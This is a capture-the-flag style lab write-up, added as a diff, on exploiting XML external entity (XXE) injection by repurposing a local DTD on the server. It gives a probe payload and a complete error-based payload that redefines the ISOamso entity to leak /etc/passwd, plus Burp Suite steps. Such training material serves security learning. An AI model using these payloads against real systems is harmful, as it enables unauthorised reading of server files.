@@ -1,0 +1,45 @@
+// Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
+
+You'll need to reference an existing DTD file on the server and redefine an entity from it.
+
+Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.
+
+
+
+// Solution
+
+
+// Locating an existing DTD file to repurpose:
+
+Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.
+
+For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:
+
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+
+
+// Steps to solve the Lab:
+
+1. Visit a product page, click "Check stock", and intercept the request resulting POST request in Burp Suite,which then send it to repeater.
+
+2.  Inject the following payload:
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+3. Send the request and lab will be solved
